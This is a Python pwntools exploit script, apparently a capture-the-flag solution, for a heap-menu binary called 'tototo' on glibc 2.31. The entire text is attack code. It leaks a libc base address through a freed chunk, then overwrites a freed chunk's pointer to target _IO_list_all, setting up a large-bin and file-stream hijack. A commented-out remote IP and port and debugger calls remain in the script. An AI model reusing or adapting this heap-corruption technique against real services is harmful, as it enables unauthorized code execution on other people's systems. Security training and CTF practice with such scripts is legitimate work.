from pwn import *
context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()
p=process('./tototo')
#p=connect('121.40.89.206',20111)
elf=ELF('./tototo')
libc=ELF('/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
def add(idx, size):
    p.sendlineafter(b'is:',b'1')
    p.sendlineafter(b'index?',str(idx).encode())
    p.sendafter(b'size?\n',str(size).encode())
def delete(idx):
    p.sendlineafter(b'is:',b'2')
    p.sendlineafter(b'one?\n',str(idx).encode())
def edit(idx, content=b'a'):
    p.sendlineafter(b'is:',b'3')
    p.sendlineafter(b'one?',str(idx).encode())
    p.sendlineafter(b'content?\n',content)
def show(idx):
    p.sendlineafter(b'is:',b'4')
    p.sendlineafter(b'one?',str(idx).encode())
def add_calloc(idx, size):
    p.sendlineafter(b'is:',b'5')
    p.sendlineafter(b'index?',str(idx).encode())
    p.sendafter(b'size?\n',str(size).encode())
add(0,0x520)
add(1,0x520)
add(2,0x510)
add(3,0x520)
delete(0)
show(0)
libc.address=u64(p.recvuntil(b'\x7f')[-6:]+b'\x00\x00')-2018272+0x1000
print(hex(libc.address))
print(hex(libc.sym['_IO_list_all']-0x20))
add(4,0x530)
assert(not (b'\n' in p64(libc.sym['_IO_list_all']-0x20)))
delete(2)

gdb.attach(p)
pause(4)
edit(0,b'a'*15+p64(libc.sym['_IO_list_all']-0x20))
add(5,0x530)

p.interactive()